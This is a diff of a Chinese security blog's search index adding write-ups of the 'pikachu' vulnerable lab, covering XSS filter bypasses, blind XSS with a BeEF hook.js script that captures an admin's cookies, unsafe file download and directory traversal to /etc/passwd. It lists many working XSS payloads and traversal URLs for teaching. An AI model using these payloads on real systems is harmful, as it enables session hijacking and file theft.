+<h2 id="普通DOM型xss"><a href="#普通DOM型xss" class="headerlink" title="普通DOM型xss"></a>普通DOM型xss</h2><p><img src="/images/1660291585340-ecdca394-b111-4505-b7b3-f72b0df0f35e.png" alt="img"></p>
+<p>由于其将输入的字符放进了html标签中的属性中，所以该类型xss攻击需要将标签闭合，并且加入自己的payload.</p>
+<p>即下面的hello我们是可控的。需要通过将a标签闭合，或通过事件触发，再放入自己的恶意payload才可以造成xss</p>
+<p><img src="/images/1660291862424-93c60fa9-14f7-4ffd-afa2-c890fdbba430.png" alt="img"></p>
+<p>a标签可以接受onclick属性，表示点击行为，点击就触发</p>
+<p>所以可以接上onclick=alert('xss')>把a的右标签也闭合了</p>
+<p>所以payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1660295072228-82da965b-ff25-475a-bd72-5b2f350f3421.png" alt="img"></p>
+<p><img src="/images/1660295264667-593a7c3d-8210-4392-bada-e495fbaeac13.png" alt="img"></p>
+<p>点击弹窗</p>
+<p><img src="/images/1660295272768-f1c011f0-8ce5-48f9-a308-440eef974a84.png" alt="img"></p>
+<p>反正只要能凑上闭合，能解析，怎么样都行</p>
+<h2 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>上述的dom型xss可以发现，输入的payload，并不与服务器交互，也不显示在url中。</p>
+<p><img src="/images/1662622837438-afaae957-f195-46b4-b2df-57311da7e03c.png" alt="img"></p>
+<p>dom型xss-x，可以发现url中存在输入的内容，可以将带有恶意payload的url发给被攻击者钓鱼</p>
+<p><img src="/images/1662622629801-cb87a0c8-53ea-4fa5-ac4b-adb43578ca1d.png" alt="img"></p>
+<p>从源码可以看出，输入到文本框的内容，会先通过get请求将内容发送到服务端</p>
+<p><img src="/images/1662623756155-e22ac861-92b7-4ed3-8eae-d1db2cb8d455.png" alt="img"></p>
+<p>服务端接收到get请求的内容，调用domxss()函数，通过修改页面的DOM节点形成新的html传回给客户端的浏览器，所以也归为为DOM XSS</p>
+<p><img src="/images/1662624234083-f986c7ba-f92f-4f3f-a2f7-ec93690f21bf.png" alt="img"></p>
+<p><img src="/images/1662624224148-501c0bca-1a61-49f1-badd-fb029a0f75e0.png" alt="img"></p>
+<p>后续利用同DOM型xss</p>
+<p>随便输入一串字符串，然后点击按钮，可以看出添加到了<a>标签中</p>
+<p><img src="/images/image-20230107233737057.png" alt="image-20230107233737057"></p>
+<p>同上题需要凑闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230107235014624.png" alt="image-20230107235014624"></p>
+<h2 id="DOM型xss和传统XSS的区别"><a href="#DOM型xss和传统XSS的区别" class="headerlink" title="DOM型xss和传统XSS的区别"></a>DOM型xss和传统XSS的区别</h2><p>DOM型XSS是一种比较特殊的XSS攻击，它利用浏览器中的DOM（文档对象模型）漏洞来实现攻击。</p>
+<p>1.DOM型XSS不依赖于服务器的输出</p>
+<p>2.DOM型XSS攻击的源代码不会被服务器端的代码直接输出，而是通过浏览器的JavaScript代码在客户端进行解析和执行。</p>
+<p>3.DOM型XSS攻击的攻击范围更广，可以通过各种手段（如邮件、聊天工具、社交媒体等）将攻击代码传递给用户，从而对用户的浏览器进行攻击。</p>
+<p>4.不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom-xss是通过url传入参数去控制触发的。(可以看作是反射型的特殊情况)</p>
+<p>与DOM型XSS相比，反射型XSS的区别在于：</p>
+<p>1.反射型XSS依赖于服务器的输出</p>
+<p>2.反射型XSS攻击的源代码会被服务器端的代码直接输出到浏览器端，然后在浏览器中执行。</p>
+<p>3.反射型XSS攻击的攻击范围较小，通常是通过邮件、聊天工具或社交媒体将攻击链接发送给目标用户，让用户自己打开链接进行攻击。</p>
+<p>总之，DOM型XSS攻击更加隐蔽，而反射型XSS攻击更容易被发现，但两者都可能对用户造成严重的安全威胁。</p>
+<h1 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h1><p><img src="/images/image-20230108191822262.png" alt="image-20230108191822262"></p>
+<p>需要绕过过滤</p>
+<p>经过尝试，该题过滤的是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script</span><br></pre></td></tr></table></figure>
+
+<p>当遇到<script时会直接被去除</p>
+<p><img src="/images/image-20230108203249590.png" alt="image-20230108203249590"></p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>下面会列举几个绕过的方式，要是有其他的方式自行查阅</p>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sCript&gt;&lt;/sCriPt&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230108212120454.png" alt="image-20230108212120454"></p>
+<p>可以看到成功解析为<script>标签</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sCrIPT&gt;alert(123)&lt;/sCrIPt&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230108211941551.png" alt="image-20230108211941551"></p>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>题目可以发现<script会被去除，所以可以用来构造payload</p>
+<p>双写绕过原理很简单，可以做个测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello&lt;scriptWorld</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230108213754256.png" alt="image-20230108213754256"></p>
+<p>可以看到<script被去掉，剩下来HelloWorld</p>
+<p>当过滤规则只替换一次且是替换为空<script时，就可以使用双写绕过</p>
+<p>测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello&lt;scri&lt;scriptptWorld</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230108220509951.png" alt="image-20230108220509951"></p>
+<p>可以看到该题并不能使用简单的双写绕过，需要配合其他绕过方式</p>
+<h3 id="各类标签绕过"><a href="#各类标签绕过" class="headerlink" title="各类标签绕过"></a>各类标签绕过</h3><h4 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h4><p>除了<script></script>还可以使用其他的标签进行利用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=alert(123)&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=alert(`1`);&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=alert(`1`)&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;1&quot; onerror=&#x27;alert(1)&#x27;;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;1&quot; onerror=&#x27;alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>该payload表示当img调用src的图片失败，则触发onerror行为，执行alert(123)</p>
+<p><img src="/images/image-20230108222853591.png" alt="image-20230108222853591"></p>
+<h4 id="SVG标签"><a href="#SVG标签" class="headerlink" title="SVG标签"></a>SVG标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=alert(1)&gt;&lt;/svg&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=alert(`1`)&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230108224804638.png" alt="image-20230108224804638"></p>
+<h4 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&quot; onclick=alert(123)&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230109085110147.png" alt="image-20230109085110147"></p>
+<p>点击后触发</p>
+<p><img src="/images/image-20230109085127282.png" alt="image-20230109085127282"></p>
+<h4 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus=alert(123)&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>onfocus表示鼠标放上去触发</p>
+<p><img src="/images/image-20230109085300848.png" alt="image-20230109085300848"></p>
+<h4 id="iframe标签"><a href="#iframe标签" class="headerlink" title="iframe标签"></a>iframe标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload=alert(123)&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe onload=alert(123)&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe onload=alert(123);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p>onload:当页面加载完毕时执行代码</p>
+<p><img src="/images/image-20230109085540498.png" alt="image-20230109085540498"></p>
+<h4 id="audio标签"><a href="#audio标签" class="headerlink" title="audio标签"></a>audio标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;audio src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230109090052786.png" alt="image-20230109090052786"></p>
+<p><img src="/images/image-20230109090104388.png" alt="image-20230109090104388"></p>
+<h4 id="video标签"><a href="#video标签" class="headerlink" title="video标签"></a>video标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;video src=x onerror=alert(111)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230109090247285.png" alt="image-20230109090247285"></p>
+<h4 id="button标签"><a href="#button标签" class="headerlink" title="button标签"></a>button标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button onfocus=alert(1)&gt;</span><br><span class="line">&lt;button onclick=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>onclick点击触发</p>
+<p><img src="/images/image-20230109090328767.png" alt="image-20230109090328767"></p>
+<h4 id="object标签"><a href="#object标签" class="headerlink" title="object标签"></a>object标签</h4><p>该标签需要配合data:&#x2F;&#x2F;text伪协议利用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxMjMpPC9zY3JpcHQ+&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230109090507237.png" alt="image-20230109090507237"></p>
+<p><img src="/images/image-20230109090547150.png" alt="image-20230109090547150"></p>
+<p><img src="/images/image-20230109090602207.png" alt="image-20230109090602207"></p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>还有其他的绕过方式，比如其他的标签，实体编码绕过，闭合等方式，可自行查阅搭建靶场进行绕过，后续题目也会涉及。</p>
+<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/E3G5juHSQjzRNSZcgiTmQA">https://mp.weixin.qq.com/s/E3G5juHSQjzRNSZcgiTmQA</a></p>
+<p><a href="https://www.freebuf.com/articles/web/339348.html">https://www.freebuf.com/articles/web/339348.html</a></p>
+<h1 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h1><p>根据提示输入tmac</p>
+<p><img src="/images/image-20230109094736189.png" alt="image-20230109094736189"></p>
+<p>前端查看js代码</p>
+<p><img src="/images/image-20230109094912346.png" alt="image-20230109094912346"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	$ms=&#x27;tmac&#x27;;</span><br><span class="line">    if($ms.length != 0)&#123;</span><br><span class="line">        if($ms == &#x27;tmac&#x27;)&#123;</span><br><span class="line">            $(&#x27;#fromjs&#x27;).text(&#x27;tmac确实厉害,看那小眼神..&#x27;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">//            alert($ms);</span><br><span class="line">            $(&#x27;#fromjs&#x27;).text(&#x27;无论如何不要放弃心中所爱..&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>再随便输入一串字符</p>
+<p><img src="/images/image-20230109095120480.png" alt="image-20230109095120480"></p>
+<p>传入的字符会被放进该$ms，于是我们就可以构造闭合</p>
+<h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先使用闭合前面的<script>，再执行自己的payload</p>
+<p><img src="/images/image-20230109095418811.png" alt="image-20230109095418811"></p>
+<p>这些题的逻辑都类似，找闭合，绕过过滤，绕过实体转换</p>
+<h1 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h1><p>盲打指的是一种攻击场景</p>
+<p>在留言框或姓名中插入Payload测试，根据提示登录到后台查看留言的信息，直接触发XSS</p>
+<p>先随便输入一些内容</p>
+<p><img src="/images/image-20230108023741293.png" alt="image-20230108023741293"></p>
+<p>提示给出了后台地址</p>
+<p><img src="/images/image-20230108023827084.png" alt="image-20230108023827084"></p>
+<p>根据提示登录</p>
+<p><img src="/images/image-20230108024052825.png" alt="image-20230108024052825"></p>
+<p>可以看到我们输入的内容</p>
+<p><img src="/images/image-20230108024128492.png" alt="image-20230108024128492"></p>
+<p>该场景叫做盲打也是因为这个，插入xss payload后，我们只能等待管理员点击从而利用</p>
+<p>数据库中能够看到插入的payload</p>
+<p><img src="/images/image-20230108030928953.png" alt="image-20230108030928953"></p>
+<p>所以也属于存储型XSS</p>
+<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>这里可以用之前的BEEF平台进行利用</p>
+<p>这里先使用alert弹窗进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(111)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230108025041967.png" alt="image-20230108025041967"></p>
+<p>当管理员登录后台后，就会出现弹窗</p>
+<p><img src="/images/image-20230108025123698.png" alt="image-20230108025123698"></p>
+<p>pikachu有自己的XSS平台</p>
+<p><img src="/images/image-20230108030049268.png" alt="image-20230108030049268"></p>
+<p>需要提前配置数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pikachu\inc\config.inc.php</span><br></pre></td></tr></table></figure>
+
+<p>安装初始化即可</p>
+<p><img src="/images/image-20230108030444690.png" alt="image-20230108030444690"></p>
+<p>这里我们使用beef进行测试</p>
+<p>具体使用在《BeEF xss利用框架安装使用.md》中有说明</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://192.168.28.150:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230108170625920.png" alt="image-20230108170625920"></p>
+<p>管理员登录到后台后</p>
+<p>可以看到beef这边已有主机信息，包括cookie等</p>
+<p><img src="/images/image-20230108170850091.png" alt="image-20230108170850091"></p>
+<h1 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h1><p>该题如果输出的信息为<a href="http://www.baidu.com时则正常输出,反之则将输入的值使用htmlspecialchars()函数进行转换/">www.baidu.com时则正常输出，反之则将输入的值使用htmlspecialchars()函数进行转换</a></p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&quot;&lt;&gt;#?</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230109094424113.png" alt="image-20230109094424113"></p>
+<p>可以发现压根没有闭合等，输入啥就是啥</p>
+<h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><p>可以使用javascript协议来执行js，当点击超链接时会执行该js脚本实现弹窗</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(123)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230109094619596.png" alt="image-20230109094619596"></p>
+<p>点击触发</p>
+<p><img src="/images/image-20230109094603430.png" alt="image-20230109094603430"></p>
+<h2 id="javascript协议"><a href="#javascript协议" class="headerlink" title="javascript协议"></a>javascript协议</h2><p>将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中。</p>
+<p>这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(123)</span><br></pre></td></tr></table></figure>
+
+<p>实际上是将javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面。</p>
+<h1 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h1><p>主要是对htmlspecialchars()函数进行绕过</p>
+<p>htmlspecialchars()是PHP里面把预定义的字符转换为HTML实体的函数</p>
+<p><img src="/images/image-20230109091304591.png" alt="image-20230109091304591"></p>
+<h2 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&quot;&lt;&gt;#?</span><br></pre></td></tr></table></figure>
+
+<p>注意需要先用一个单引号将href的双引号闭合后才能看出结果</p>
+<p><img src="/images/image-20230109092023309.png" alt="image-20230109092023309"></p>
+<p>根据上方返回的信息可以看到字符双引号，<，>都被转换成了HTML实体函数(默认不对'进行处理)</p>
+<h2 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h2><p>寻找闭合，避开被转换的字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(123) &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>点击触发</p>
+<p><img src="/images/image-20230109092702680.png" alt="image-20230109092702680"></p>
+<h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/escape-w/p/10162831.html">https://www.cnblogs.com/escape-w/p/10162831.html</a></p>
+</script></p>]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>pikachu靶场系列-不安全的文件下载</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
+    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>当存在文件下载功能时，如果没有做好限制，则可能会造成任意文件下载，源码泄露等严重后果</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>抓取下载功能的数据包</p>
+<p><img src="/images/image-20230110105403955.png" alt="image-20230110105403955"></p>
+<p>文件下载的url为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=mbl.png</span><br></pre></td></tr></table></figure>
+
+<p>如果未做好限制，则会造成任意文件下载</p>
+<h5 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230110105601275.png" alt="image-20230110105601275"></p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-文件包含</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
     <content><![CDATA[<h1 id="文件包含概述"><a href="#文件包含概述" class="headerlink" title="文件包含概述"></a>文件包含概述</h1><p><img src="/images/1665555684868-38ea26c8-b175-45e4-95a3-435db5eb951b.png" alt="img"></p>
@@ -1808,30 +2129,6 @@
       </categories>
   </entry>
   <entry>
-    <title>pikachu靶场系列-目录遍历</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
-    <content><![CDATA[<p>目录遍历，这里更像是路径穿越</p>
-<p>很像本地文件包含</p>
-<p>如果是linux系统，可以访问</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这里可以看下源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;title&#x27;]))&#123;</span><br><span class="line">    $filename=$_GET[&#x27;title&#x27;];</span><br><span class="line">    //这里直接把传进来的内容进行了require(),造成问题</span><br><span class="line">    require &quot;soup/$filename&quot;;</span><br><span class="line">//    echo $html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>require()也是用于文件包含的函数</p>
-<p>和include()的区别在于</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include() 出错仅是警告，脚本继续执行 </span><br><span class="line">require() 出错则爆出致命错误，脚本立刻终止 </span><br></pre></td></tr></table></figure>
-
-<p>所以这里当作文件包含利用即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/dir/dir_list.php?title=../../../shell.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230110143442285.png" alt="image-20230110143442285"></p>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
     <title>pikachu靶场系列-越权</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E8%B6%8A%E6%9D%83/</url>
     <content><![CDATA[<h1 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h1><p>越权，字面意思就是越过权限，完成其他权限拥有的操作</p>
@@ -1880,6 +2177,30 @@
 <p>退出登录</p>
 <p>登录pikachu用户，访问删除接口测试</p>
 <p>经测试，删除接口不存在越权</p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>pikachu靶场系列-目录遍历</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
+    <content><![CDATA[<p>目录遍历，这里更像是路径穿越</p>
+<p>很像本地文件包含</p>
+<p>如果是linux系统，可以访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这里可以看下源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;title&#x27;]))&#123;</span><br><span class="line">    $filename=$_GET[&#x27;title&#x27;];</span><br><span class="line">    //这里直接把传进来的内容进行了require(),造成问题</span><br><span class="line">    require &quot;soup/$filename&quot;;</span><br><span class="line">//    echo $html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>require()也是用于文件包含的函数</p>
+<p>和include()的区别在于</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include() 出错仅是警告，脚本继续执行 </span><br><span class="line">require() 出错则爆出致命错误，脚本立刻终止 </span><br></pre></td></tr></table></figure>
+
+<p>所以这里当作文件包含利用即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/dir/dir_list.php?title=../../../shell.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230110143442285.png" alt="image-20230110143442285"></p>
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
